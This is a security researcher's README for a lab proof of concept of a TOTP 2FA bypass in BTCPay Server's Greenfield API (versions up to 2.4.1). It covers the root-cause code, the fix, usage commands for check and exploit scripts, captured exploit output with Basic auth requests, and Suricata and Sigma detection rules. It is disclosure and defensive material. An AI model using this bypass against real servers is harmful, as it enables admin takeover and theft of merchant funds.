<p align="center">
  <img src="poster.png" alt="BTCPay Server Greenfield API TOTP 2FA Bypass" width="760">
</p>

<p align="center">
  <a href="https://github.com/al4n4n/achilles-heel/stargazers"><img src="https://img.shields.io/github/stars/al4n4n/achilles-heel?style=flat-square" alt="Stars"></a>
  <img src="https://img.shields.io/badge/CVSS-8.8_(High,%20est.)-orange?style=flat-square" alt="CVSS">
  <img src="https://img.shields.io/badge/affected-%3C%3D%202.4.1-red?style=flat-square" alt="Affected">
  <img src="https://img.shields.io/badge/fixed-2.4.2-green?style=flat-square" alt="Fixed">
  <img src="https://img.shields.io/badge/python-3.8%2B-blue?style=flat-square" alt="Python">
</p>

<p align="center">
  <a href="#check-non-destructive">Check</a> ·
  <a href="#the-bypass">Exploit</a> ·
  <a href="#detection-rules">Detection</a> ·
  <a href="#pcap">PCAP</a> ·
  <a href="#downstream-impact">Impact</a> ·
  <a href="https://blog.al4n4n.com/btcpay-greenfield-2fa-bypass/">Write-up</a>
</p>

---

> **Disclaimer.** For learning and defense only. Run the lab and PoC only against targets you set up yourself. The detection rules are for education only; use them at your own risk. Everything here is provided as is, without warranty. Full text: [DISCLAIMER](../DISCLAIMER.md).

# BTCPay Server Greenfield API — TOTP 2FA Bypass (PR #7491)

**CWE-287 Authentication Bypass | 2FA (TOTP) bypass via HTTP Basic auth | affected: BTCPay Server <= 2.4.1 | attack surface: authenticated Greenfield API**

BTCPay Server's Greenfield API accepts HTTP Basic authentication (email + password). On
builds up to 2.4.1 the Basic-auth handler only refused accounts that had a **FIDO2**
hardware key registered — it never checked for **TOTP** (authenticator-app) 2FA. So an
account protected by TOTP could be fully authenticated against the entire API with nothing
but a stolen email and password, **with no second factor**. The browser login for the same
account correctly demands the TOTP code; only the API was blind to it. Where the account is
a server admin, the bypass yields unrestricted, server-wide API access. This class of
compromise was reported in the wild in August 2026 (Lightning nodes drained after
credentials were stolen).

**Author:** al4n4n (Dadb0d) · **write-up:** [blog.al4n4n.com/btcpay-greenfield-2fa-bypass/](https://blog.al4n4n.com/btcpay-greenfield-2fa-bypass/) · **fixed in:** v2.4.2
([PR #7491](https://github.com/btcpayserver/btcpayserver/pull/7491), hardened by
[PR #7492](https://github.com/btcpayserver/btcpayserver/pull/7492)).

---

## The bug

The whole decision lives in
[`BTCPayServer/Security/GreenField/BasicAuthenticationHandler.cs`](https://github.com/btcpayserver/btcpayserver/blob/v2.4.1/BTCPayServer/Security/GreenField/BasicAuthenticationHandler.cs).
After decoding the `Authorization: Basic` header and loading the user (eager-loading
`Fido2Credentials`), the handler's only multi-factor gate in 2.4.1 is:

```csharp
if (user.Fido2Credentials.Any())
{
    return Fail("Cannot use Basic authentication when multi-factor is enabled.");
}
var result = await signInManager.CheckPasswordSignInAsync(user, password, true);
// ... issues a ClaimsIdentity with Permission = Policies.Unrestricted
```

`Fido2Credentials.Any()` is true only for users who registered a **hardware** key. A user
whose second factor is TOTP has *zero* FIDO2 credentials, so the check passes, the password
is verified, and the handler mints a claims identity carrying the **`Unrestricted`**
permission plus the user's roles. 2FA is simply never consulted. The browser login path is a
different code path that *does* enforce TOTP — it redirects to `/login/second-login` — which
is why the gap went unnoticed: the UI looked protected.

The fix (PR #7491) replaces the FIDO2-only test with a check for *any* enrolled second
factor:

```csharp
if (await signInManager.IsTwoFactorEnabledAsync(user))
{
    return Fail("Cannot use Basic authentication when multi-factor is enabled.");
}
```

v2.4.2 also folds in PR #7492: Basic auth for the Greenfield API is now disabled by default
and only honored for the first 5 minutes after account creation unless a per-user opt-in
(`AllowGreenfieldBasicAuth`) is set — defense in depth on top of the 2FA fix.

## Trigger conditions

1. BTCPay Server **<= 2.4.1**.
2. A target account with **TOTP (authenticator-app) 2FA enabled** and **no FIDO2 credential**.
3. The attacker knows that account's **email + password** (e.g. phished/leaked). No TOTP
   code, recovery code, FIDO2 assertion, or API key is needed.
4. Network reach to the Greenfield API (`/api/v1/...`).

## Files

| File | Purpose |
|---|---|
| `setup.py` | Boots the lab: PostgreSQL + BTCPay 2.4.1 (vuln) + 2.4.2 (fixed), provisions an admin with **real TOTP 2FA** on each via the web flow. |
| `check.py` | Non-destructive detector. One read-only `GET /api/v1/users/me`. Exit 0/1/2, `--json`. |
| `poc.py` | Single-shot exploit. Basic auth with password only; prints the bypass and what it unlocks. |
| `verify.py` | Dashboard: N rounds + negative control against the patched version. |
| `detection/btcpay-greenfield-2fa-bypass.rules` | Suricata rules (Basic auth to Greenfield; sensitive-endpoint enumeration; patched-server rejection). |
| `detection/btcpay-greenfield-2fa-bypass.yml` | Sigma rules for a reverse-proxy / web access log. |
| `capture/exploit.pcap` | Live tcpdump capture of the exploit traffic (50 packets, cleartext HTTP). |
| `capture/README.md` | How the PCAP was captured + Suricata test command. |
| `poster.png` | 1200x630 summary card. |

## Repository structure

```
btcpay-greenfield-2fa-bypass/
├── setup.py
├── check.py
├── poc.py
├── verify.py
├── detection/
│   ├── btcpay-greenfield-2fa-bypass.rules   # Suricata
│   └── btcpay-greenfield-2fa-bypass.yml     # Sigma
├── capture/
│   ├── exploit.pcap
│   └── README.md
├── poster.png
├── LICENSE
└── README.md
```

## Usage

```bash
# 1. boot the lab (pulls images, provisions TOTP 2FA on both versions)
python3 setup.py                       # vuln on :8080, fixed on :8081

# 2. non-destructive check
python3 check.py  --url http://127.0.0.1:8080 --user admin@lab.local --password 'Lab-Passw0rd!2026'

# 3. single-shot exploit
python3 poc.py    --url http://127.0.0.1:8080 --user admin@lab.local --password 'Lab-Passw0rd!2026'

# 4. verify with negative control against the patch
python3 verify.py --url http://127.0.0.1:8080 --fixed-url http://127.0.0.1:8081 \
                  --user admin@lab.local --password 'Lab-Passw0rd!2026' --rounds 5

# teardown
python3 setup.py --teardown
```

> The output below was captured on host ports **18080/18081** because 8080/8081 were in use by
> unrelated labs on the research host. Behavior is identical; only the port differs.

## Check (non-destructive)

```
$ python3 check.py --url http://127.0.0.1:18080 --user admin@lab.local --password 'Lab-Passw0rd!2026'
[+] VULNERABLE (confidence: high)
    target : http://127.0.0.1:18080
    status : HTTP 200
    reason : Basic auth authenticated the account with no 2FA factor.

$ python3 check.py --url http://127.0.0.1:18081 --user admin@lab.local --password 'Lab-Passw0rd!2026'
[-] NOT VULNERABLE (confidence: high)
    target : http://127.0.0.1:18081
    status : HTTP 401
    reason : Patched handler rejected Basic auth for the 2FA account.
```

Exit codes: `0` vulnerable, `1` not vulnerable, `2` unknown. Without credentials it reports
`UNKNOWN` (the Greenfield API is present but the 2FA branch needs a known account to probe).

## The bypass

`poc.py` sends **only** an email + password — no TOTP code — and is authenticated as the
`ServerAdmin` account:

```
$ python3 poc.py --url http://127.0.0.1:18080 --user admin@lab.local --password 'Lab-Passw0rd!2026'
[>] Request:
    GET http://127.0.0.1:18080/api/v1/users/me
    Authorization: Basic YWRtaW5AbGFiLmxvY2FsOkxhYi1QYXNzdzByZCEyMDI2
    (base64 decodes to: admin@lab.local:Lab-Passw0rd!2026)

[<] Response: HTTP 200
    {"id":"2c043391-...","email":"admin@lab.local",...,"roles":["ServerAdmin"],...}

[+] 2FA BYPASS CONFIRMED
    authenticated as : admin@lab.local  (id 2c043391-91d8-4c83-a0fe-bcbec0ecec35)
    roles            : ['ServerAdmin']

[>] Measuring what the bypass unlocks (read-only probes):
    [+] /api/v1/users                            HTTP 200  (reachable)   # all users, server-admin scope
    [+] /api/v1/stores                           HTTP 200  (reachable)
    [+] /api/v1/server/info                      HTTP 500  (reachable)   # past auth; errors in minimal lab
    [+] /api/v1/server/lightning/BTC/info        HTTP 404  (reachable)   # "lightning-not-configured"
```

The `verify.py` dashboard, 5 rounds + negative control:

```
 TEST EXECUTION  (expect HTTP 200 = bypass on the vulnerable target)
   round  1/5  ->  HTTP 200  [BYPASS]
   ... round 5/5 -> HTTP 200 [BYPASS]
   [*] server-admin endpoint /api/v1/users: HTTP 200 REACHABLE
 VERDICT
   [+] VULNERABLE  -  2FA bypass succeeded 5/5 rounds (100%)
       Impact: server-admin endpoints reachable (unrestricted permission).
```

## Negative control

The **identical** request against patched v2.4.2 is refused by the exact string the fix
introduced:

```
 NEGATIVE CONTROL (patched target - identical request)
   http://127.0.0.1:18081/api/v1/users/me  ->  HTTP 401
   body: {"code":"unauthenticated","message":"Cannot use Basic authentication when multi-factor is enabled."}
   patched rejection: CONFIRMED  (PR #7491 2FA gate)
```

(The lab enables the `AllowGreenfieldBasicAuth` opt-in on the fixed target so the request
reaches the PR #7491 2FA gate; with the default settings an established account is refused one
step earlier by the PR #7492 opt-in gate — *"Basic authentication for the Greenfield API is
not enabled for this user."* Either way the bypass is dead.)

## Downstream impact

| Surface / consumer | Effect of the bypass |
|---|---|
| Server-admin account | Full Greenfield API as `Unrestricted`: list/modify users, server settings, stores. |
| Internal Lightning node (LND/CLN/LNbits via the API) | The `/api/v1/.../lightning/...` endpoints are reachable past auth (lab had no node configured, so credential extraction was not exercised — see claims table). |
| Store wallets / payouts / pull payments | Store-scoped API reachable with the compromised account's permissions. |
| Umbrel / Start9 / self-hosted Docker deployments shipping BTCPay <= 2.4.1 | Inherit the bug until updated to 2.4.2 (and NBXplorer 2.6.10). |

## Detection rules

- **Suricata** — [`detection/btcpay-greenfield-2fa-bypass.rules`](detection/btcpay-greenfield-2fa-bypass.rules):
  SID `9100001` flags any HTTP Basic auth to `/api/v1/`; `9100002` raises severity for Basic
  auth to server-admin / Lightning endpoints; `9100003` fires on the patched server's
  rejection body (someone probing a patched box). Validated with `jasonish/suricata`:
  `9100001` + `9100002` fire on every request in the shipped `exploit.pcap`; `9100003` fires
  on a v2.4.2 rejection capture (see `capture/README.md`).
- **Sigma** — [`detection/btcpay-greenfield-2fa-bypass.yml`](detection/btcpay-greenfield-2fa-bypass.yml):
  two `webserver` rules for a reverse-proxy access log — Greenfield API + `Authorization: Basic`,
  and server-admin-endpoint enumeration. Includes the nginx `log_format` needed to record the
  auth scheme.

## PCAP

[`capture/exploit.pcap`](capture/exploit.pcap) — 50-packet **live** tcpdump capture, cleartext
HTTP, `172.19.0.1 -> 172.19.0.3`, showing five Basic-auth Greenfield requests and their
responses. Test the rules:

```bash
suricata -r capture/exploit.pcap -S detection/btcpay-greenfield-2fa-bypass.rules -l /tmp/suri -k none
cat /tmp/suri/fast.log   # -> SID 9100001 and 9100002 on every request
```

See [`capture/README.md`](capture/README.md) for the capture method and the patched-server test.

## What this repo proves (and does not prove)

| Claim | Status | Evidence |
|---|---|---|
| TOTP-2FA account authenticated over the Greenfield API with password only | **Proven** | `GET /api/v1/users/me` -> HTTP 200, 5/5 rounds, on 2.4.1 |
| Bypass grants server-admin (`Unrestricted`) scope | **Proven** | `GET /api/v1/users` (all users) -> HTTP 200; identity `roles:["ServerAdmin"]` |
| Browser login still enforces TOTP (only the API is blind) | **Proven** | Password-only web login -> 302 `/login/second-login`; `/account` stays unauthenticated |
| Patched v2.4.2 refuses the identical request | **Confirmed** | Negative control: HTTP 401 *"...multi-factor is enabled."* |
| Lightning macaroon / fund extraction via the bypass | **Not proven** | LN endpoints reachable past auth (HTTP 404 `lightning-not-configured`); no LN node was configured in the lab, so no credential was extracted |
| Root cause is the FIDO2-only MFA check | **Proven** | Source diff v2.4.1 vs v2.4.2 of `BasicAuthenticationHandler.cs` |

## References

- Fix PR: https://github.com/btcpayserver/btcpayserver/pull/7491 (merged 2026-08-04, commit `c173a91`)
- Hardening PR: https://github.com/btcpayserver/btcpayserver/pull/7492
- Vulnerable source: https://github.com/btcpayserver/btcpayserver/blob/v2.4.1/BTCPayServer/Security/GreenField/BasicAuthenticationHandler.cs
- Fixed source: https://github.com/btcpayserver/btcpayserver/blob/v2.4.2/BTCPayServer/Security/GreenField/BasicAuthenticationHandler.cs
- Release v2.4.2: https://github.com/btcpayserver/btcpayserver/releases/tag/v2.4.2 (upgrade NBXplorer to 2.6.10; rotate any credentials that may already be stolen)
- No CVE ID or GitHub Security Advisory was published by the vendor. The CVSS above is this
  researcher's estimate: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8 (High)**
  (`PR:L` because the attack still requires the victim's password; real-world severity tracks
  the credential-theft that precedes it).

## License

Part of [achilles-heel](https://github.com/al4n4n/achilles-heel), licensed under [CC BY 4.0](../LICENSE). Anyone who shares or builds on this work, commercial or not, must credit "al4n4n (Dadb0d)" and link to https://github.com/al4n4n/achilles-heel. See [Attribution](../README.md#attribution) and [DISCLAIMER](../DISCLAIMER.md).

<!-- citation:start -->
## Cite this research

> al4n4n (Dadb0d). BTCPay Server Greenfield API TOTP 2FA bypass (btcpay-greenfield-2fa-bypass). *achilles-heel*, added 2026-11-04. <https://github.com/al4n4n/achilles-heel/tree/main/btcpay-greenfield-2fa-bypass>. [Research article](https://blog.al4n4n.com/btcpay-greenfield-2fa-bypass/).
<!-- citation:end -->
